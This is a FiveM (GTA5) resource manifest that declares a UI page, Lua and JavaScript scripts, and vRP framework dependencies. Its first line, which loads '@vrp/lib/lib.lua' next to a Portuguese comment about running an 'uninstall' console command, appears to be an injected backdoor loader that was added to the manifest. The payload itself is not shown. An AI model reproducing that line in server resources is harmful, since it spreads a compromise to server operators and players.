client_script "@vrp/lib/lib.lua" --Para remover esta pendencia de todos scripts, execute no console o comando "uninstall"

fx_version 'adamant'
game 'gta5'

ui_page "index.html"

files {"index.html"}

client_scripts {"unique.lua"}

server_scripts {"@vrp/lib/utils.lua", "unique.lua", "server.js"}
              